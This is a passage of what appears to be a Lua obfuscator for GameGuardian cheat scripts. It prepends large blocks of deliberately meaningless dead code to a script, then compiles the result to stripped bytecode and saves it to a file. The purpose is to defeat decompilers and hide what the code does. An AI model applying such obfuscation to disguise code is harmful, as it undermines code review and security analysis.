for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
 while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
]]

BATMAN1 = [[
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
]]

dados_saida = SSFUCK..SPAM..BATMAN1..BATMAN2..BATMAN3..BATMAN4..BATMAN5..blocksstol..Infinite..DECODE .. dados_saida
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
B=string.dump(load(dados_saida),true)

io.open(g.out, "w"):write(B) 

alertBatman = '📂 File Saved To: '..g.out..'\n'
gg.alert(alertBatman, '')
print("\n▬▬▬▬▬▬▬▬▬▬▬▬▬\n📂 File Saved To :" .. g.out .. "\n▬▬▬▬▬▬▬▬▬▬▬▬▬")
return 
end 